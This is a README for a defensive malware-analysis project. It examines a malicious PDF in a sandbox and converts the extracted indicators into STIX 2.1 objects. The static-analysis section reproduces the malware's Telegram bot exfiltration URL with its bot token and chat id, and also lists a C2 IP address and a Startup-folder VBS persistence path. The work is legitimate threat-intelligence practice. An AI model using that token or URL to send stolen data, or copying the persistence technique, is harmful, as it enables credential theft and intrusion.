# **Malicious PDF Analysis to STIX 2.1 Report**


## Overview

This project presents a hybrid analysis of a malicious PDF file.
The goal is to extract Indicators of Compromise (IOC) and convert them into **STIX 2.1 format** for structured threat intelligence.

**<img width="542" height="395" alt="1" src="https://github.com/user-attachments/assets/75f76385-b07e-4942-88f7-8067558f5d48" />**

## Sample Information
Target file obtained from MalwareBazaar:
* **Filename**: `FA8766789000-9876.pdf`
**<img width="1218" height="313" alt="2" src="https://github.com/user-attachments/assets/e6515b10-591e-4828-b8b0-6ac85dac70ab" />**
  
### VirusTotal Result

*Security vendor detection score 
**<img width="1249" height="499" alt="3" src="https://github.com/user-attachments/assets/3e110786-0635-4e09-9ece-3ccdd89ffb70" />**

Source: 
- [**virustotal**](https://www.virustotal.com/gui/file/cb059cce696e7706a6524cebd80e05115f71dc6b95bac59f578dfe5356051df7)

---

## Analysis Workflow

This section explains the analysis process from raw sample to structured STIX data.

---

### **1. Sample Details**
**<img width="1112" height="138" alt="4" src="https://github.com/user-attachments/assets/f40a7c3c-a4df-41f4-b085-c028238c4d30" />**

* **MD5**   : `<5c6459dd0e67a6953bc4b4e0aef77080>`
* **SHA256**: `<cb059cce696e7706a6524cebd80e05115f71dc6b95bac59f578dfe5356051df7>`
  
----

### **2. Malware Analysis (Any.Run)**

To analyze the behavior and contents of the PDF, a hybrid analysis approach is used.

**Any.Run** is utilized because it provides:

* Static & dynamic analysis
* IOC extraction

**<img width="839" height="635" alt="8" src="https://github.com/user-attachments/assets/0b59a8c1-95b1-4eec-8769-f8db6ad1aadd" />**

After we checked findings embedded file in inside the pdf file, the name file is a `SDA5678000987655600.uue`

**<img width="849" height="225" alt="9" src="https://github.com/user-attachments/assets/f9430267-11d2-457f-ab74-682a1b69b310" />**

we extracted the embedded file used tools pdf extractor for continue the results of this file

**<img width="163" height="197" alt="10" src="https://github.com/user-attachments/assets/5f96a930-a188-4576-a4dc-5afbb4f0a124" />**

and type the result of the `SDA5678000987655600.uue` file containing malicious ip address & malicious id 

**<img width="855" height="111" alt="11" src="https://github.com/user-attachments/assets/b5815a52-959c-45f3-8bb3-6019264c0f86" />**

* **MD5**   : `<bd5446be6237a7deab6f4f756c72a50b>`
* **SHA256**: `<f660a929470a9ecddc4cd3f2464fb7c831a10cf3307e59914d31fa9109d39f60>`






source
- [**result of FA8766789000-9876.pdf**](https://app.any.run/tasks/e493f22c-f04d-47a0-a2d6-5246c5a11b40)
- [**result of SDA5678000987655600.uue**](https://app.any.run/tasks/0aede974-8589-4aeb-b989-e97e87c8ff0f?p=69e417dfff02e699041a3a67)


Static and dynamic analysis result can picturing on below

---

#### 🔹 Static Analysis
**<img width="774" height="523" alt="statis tele api" src="https://github.com/user-attachments/assets/58ad7e77-1f60-4429-a3ff-5a85addac10f" />**

**Findings:**

1. URL: `https://api.telegram.org/bot6791427761:AAEq2ybkfsfQ4vvX1WVwRKr-rekQ-dk6jcM/sendDocument?chat_id=6443825857&caption=%20Pc%20Name:%20admin%20%7C%20Snake%20Tracker%0D%0A%0D%0APW%20%7C%20admin%20%7C%20Snake`
2. Ip address server: `149.154.166.110`
3. Telegram token: `6791427761:AAEq2ybkfsfQ4vvX1WVwRKr-rekQ-dk6jcM`
4. Telegram chat id: `6443825857`


---

#### 🔹 Dynamic Analysis

**<img width="722" height="389" alt="dinamis" src="https://github.com/user-attachments/assets/dc8fd9a9-fdef-4c71-a040-c5f8adfa4a4d" />**

Dynamic analysis was performed on the file malware.pdf, which contains an embedded file. After being analyzed using ANY.RUN, the embedded content was successfully detected through the platform’s on-screen operating system activity monitoring, where all system interactions were observed in real time via the web-based sandbox environment.

**Findings:**


1. Read and write registry in path: `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{9B99CA21-B296-4C2D-9EBA-DCD1E0C59612}`

**<img width="601" height="362" alt="14" src="https://github.com/user-attachments/assets/b0ef47f5-6f5d-42a6-a0cf-8a034326c7a3" />**

2. Starts itself from another location  `C:\Users\admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\slashing.vbs`
**<img width="600" height="389" alt="13" src="https://github.com/user-attachments/assets/ccaa30f6-52f6-463c-8155-c7cf4f4cebc0" />**

---

### IOC Extraction

All findings from static and dynamic analysis are combined into a single IOC table.

---




| Field           | Value                               |
|----------------|-------------------------------------|
| Type           | <name_type>                         |
| Name           | <definitely_of_malware>                        |
| Description    | <description_from_activit_of_malware> |
| Indicator Type | <type_indicator_of_malware>         |
| Pattern Type   | <pattern_type_of_malware>           |
| Pattern        | <pattern_can_be_a_url>   

The raw IOC data is then transformed into structured STIX objects:

* **Indicator Object**
**<img width="426" height="467" alt="6" src="https://github.com/user-attachments/assets/955abe10-3c80-460d-a4e5-3868a16eabf7" />**
  
The SDO Indicator table represents the mapping of malware analysis results into
SDO Indicator propeties. In this object, the URL is defined as a pattern used to 
communicate with the attackers bot program. The `indicator_type` field describes the
type of threat activity, reflecting the threat level and how dangerous the attack is 
. The pattern int the table represents the behavior of  the malware, specificalyy the 
use of a URL to communicate with the attackers bot. Meanwhile, `pattern_type` defines
the format or syntax used to express the pattern according to the STIX standard

* **Malware Object**

**<img width="473" height="168" alt="7" src="https://github.com/user-attachments/assets/fd589e5e-f80f-4b8f-83d5-1340eea23ebf" />**

The SDO Malware tables provides a structured representation of the malware based on 
the analysis results. The `descripton` property summarizes the observed malware
activity, while the `name` field may included the SHA-256 hash as an identified
derived from static analysis. The `kill_chain_name` represents the model used in the used
in STIX to describe the attackers actions. Meanwhile, `phase_name` refers to the specific
stage within the malware attack lifecyclee, indicating where the malware or threat 
actors activity occurs in the overall intrusion process.


---

#### STIX Relationship
That describes the way in which the objects are related. Relationships can be represented using an external STIX Relationship Object (SRO)

source 
- [**oasis**](https://docs.oasis-open.org/cti/stix/v2.1/stix-v2.1.html#stix-relationships)


---

### **4. Implementation (Python STIX Conversion)**

A Python script is created to convert IOC data into STIX 2.1 format.

### Code Preview

**<img width="777" height="537" alt="15" src="https://github.com/user-attachments/assets/d6ecd515-a5be-49fd-b207-5933a17c3dc7" />**

Lets to breakdown the code 

**INDICATOR**

**<img width="424" height="180" alt="16" src="https://github.com/user-attachments/assets/1127a46c-37a0-429c-8ef1-709e08ad7e24" />**

The indicator object represents an Indicator of Compromise (IOC), specifically 
an Ip address used for command and control communication. It includes several 
properties such as `name`, whic identifies the indicator, and `description`
which explain its role in communicating with the attacker. The `indicator_types`
field classifies the activity as malicious, while `pattern_type` specifies that 
the pattern follows the STIX standard. The `pattern` itself defines the IOC
using STIX Patterning Langugage, indicating the suspecious Ip address. Addtionally
, `valid_from` record the time when the indicator becomes valid

**MALWARE**

**<img width="537" height="153" alt="17" src="https://github.com/user-attachments/assets/e1552f30-001c-42f5-921e-fc4a1b6b04a5" />**


**RELATIONSHIP**

**<img width="276" height="126" alt="18" src="https://github.com/user-attachments/assets/56615431-d0fa-4319-8855-8562bb98c845" />**

---


#### Output Result

**INDICATOR**

**<img width="583" height="335" alt="19" src="https://github.com/user-attachments/assets/6ec4cea4-1244-497e-b499-9cd53430d46e" />**

The Indicator object in the STIX 2.1 output represents a technical artifact identified as an indicator of malicious activity. In this data, the indicator is an IP address (149.154.166.110) classified as malicious-activity because it is used in Command and Control (C2) communication. The pattern attribute uses the STIX Patterning format ([ipv4-addr:value = '149.154.166.110']), which enables security systems to automatically detect the presence of this IOC. Additionally, temporal information such as `created`, `modified`, and `valid_from` provides context regarding when the indicator was generated and when it became valid, supporting forensic analysis and threat correlation.

**MALWARE**

**<img width="608" height="308" alt="20" src="https://github.com/user-attachments/assets/f8cc48ee-fc97-4e4b-9c99-484ddc57c4e2" />**

The Malware object represents a malicious software entity associated with the identified indicator. In this result, the malware is named “Slashing Trojan” and is classified as a trojan, indicating that it operates by disguising itself as a legitimate program to deceive the victim. The description explains that this malware uses an IP address as a medium for communication with a Command and Control (C2) server. The `is_family` attribute is set to false, indicating that this entity is treated as a specific sample rather than a general representation of a malware family.

**RELATIONSHIP**

**<img width="880" height="244" alt="21" src="https://github.com/user-attachments/assets/5a582dd7-5c27-4488-8900-8172ea0ec22d" />**


The Relationship object is used to connect entities within STIX, forming a more comprehensive threat context. In this data, the relationship type “indicates” is used to express that the identified IP indicator suggests the presence or activity of the “Slashing Trojan” malware. The `source_ref` attribute refers to the Indicator object, while the `target_ref` points to the Malware object. With this relationship, the analysis becomes more structured, as the system can understand the connection between the IOC and the threat it represents, thereby facilitating detection, investigation, and incident response processes.

---

**Conclusion**

This project demonstrates how raw malware analysis data can be transformed into structured threat intelligence using STIX 2.1, enabling better detection, sharing, and automation.

---

  



